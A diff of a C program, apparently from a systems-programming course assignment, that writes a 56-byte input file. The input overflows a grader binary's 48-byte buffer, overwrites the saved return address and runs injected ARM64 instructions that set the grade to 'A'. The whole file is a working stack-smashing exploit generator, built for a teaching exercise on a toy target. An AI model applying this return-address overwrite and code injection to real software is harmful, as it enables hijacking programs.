@@ -1,56 +1,77 @@
+
+
+
+/*
+ * createdataA.c
+ *
+ * Purpose:
+ *   Emit "dataA" (56 bytes) which, when fed to the grader, will:
+ *     – overflow readString’s buf[48] and smash its saved x30
+ *       so that getName’s ret jumps into our stub in name[].
+ *     – the stub (executing in name[] BSS, now RWX) will:
+ *         * write 'A' into the global grade variable
+ *         * branch to 0x40089c (the grader’s print-grade code)
+ *   All stub instructions are assembled with MiniAssembler_*.
+ */
+
 #include <stdio.h>
 #include "miniassembler.h"
+#include <string.h>
 
 int main(void)
 {
-    FILE *psFile;
-    int i;
-    unsigned long returnAddr = 0x400890;
-    unsigned long pc; 
-    int instr; 
+    FILE           *f;
+    unsigned long   pc;
+    unsigned int    instr;
+    int             i;
+    const char *name; 
 
-    psFile = fopen("dataA", "w");
-    pc = 0; 
-    /* 99 total instructions * 4 = 396*/
-    instr = MiniAssembler_adr(1, 396, pc); 
-    fwrite(&instr, 4, 1, psFile); 
-    pc+= 4; 
+    /* These constants come from the grader’s map: */
+    const unsigned long NAME_ADDR   = 0x420058UL;  /* start of name[] in BSS */
+    const unsigned long GRADE_ADDR  = 0x420044UL;  /* &grade global ('D') */
+    const unsigned long PRINT_ADDR  = 0x40089cUL;  /* skip-B, print-grade code */
 
-    for (i = 0; i < 24; i++) { 
-        instr = MiniAssembler_mov(0, (int)"Ben Zhou and Owen Clarke"[i]);
-        fwrite(&instr, 4, 1, psFile);
-        pc+=4; 
+    /* 1) Open the attack file for binary write */
+    f = fopen("dataA", "wb");
+    if (!f) return 1;
 
-        instr = MiniAssembler_adr(2, 396 + i, pc); 
-        fwrite(&instr, 4, 1, psFile); 
-        pc+=4; 
 
-        instr = MiniAssembler_strb(0, 2); 
-        fwrite(&instr, 4, 1, psFile); 
-        pc+=4; 
+
+
+    /* 2) Emit a 48-byte stub into buf[] (and ultimately name[]): */
+    pc = NAME_ADDR;  /* at runtime, the stub’s first instr is at NAME_ADDR */
+
+    /* a) ADR  X0, GRADE_ADDR(PC)   ; X0 ← &grade       */
+    instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
+    fwrite(&instr, 4, 1, f);  pc += 4;
+
+    /* b) MOV  W1, #'A'             ; W1 ← ASCII 'A'   */
+    instr = MiniAssembler_mov(1, (int)'A');
+    fwrite(&instr, 4, 1, f);  pc += 4;
+
+    /* c) STRB W1, [X0]             ; *(&grade) = 'A'  */
+    instr = MiniAssembler_strb(1, 0);
+    fwrite(&instr, 4, 1, f);  pc += 4;
+
+    /* d) B    PRINT_ADDR(PC)       ; jump into grader’s printf */
+    instr = MiniAssembler_b(PRINT_ADDR, pc);
+    fwrite(&instr, 4, 1, f);  pc += 4;
+
+
+    /* e) Pad stub out to 48 bytes with harmless MOV W0,#0 (acts like NOP) */
+    for (; pc < NAME_ADDR + 48; pc += 4) {
+        instr = MiniAssembler_mov(0, 0);
+        fwrite(&instr, 4, 1, f);
     }
-    instr = MiniAssembler_mov(0,0); 
-    fwrite(&instr, 4, 1, psFile); 
-    pc+=4; 
 
-    for (i = 0; i < 24; i++) { 
-        instr = MiniAssembler_strb(0, 2); 
-        fwrite(&instr, 4, 1, psFile); 
-        pc+=4; 
-    }
 
-    instr = MiniAssembler_b(returnAddr, 392); 
-    fwrite(&instr, 4, 1, psFile); 
-    pc+=4; 
 
-    fwrite("Ben Zhou and Owen Clarke", 1, 24, psFile);  
-    fputc(0, psFile);                                    
-    for (i = 0; i < 23; i++)                             
-        fputc(0, psFile);
 
-    fwrite(&returnAddr, sizeof returnAddr, 1, psFile); 
 
-    fclose(psFile);
+    /* 3) Overwrite readString’s saved x30 with NAME_ADDR
+        so that when readString does `ret`, it jumps into our stub. */
+    fwrite(&NAME_ADDR, sizeof(NAME_ADDR), 1, f);
 
+    fclose(f);
     return 0;
-} 
+}
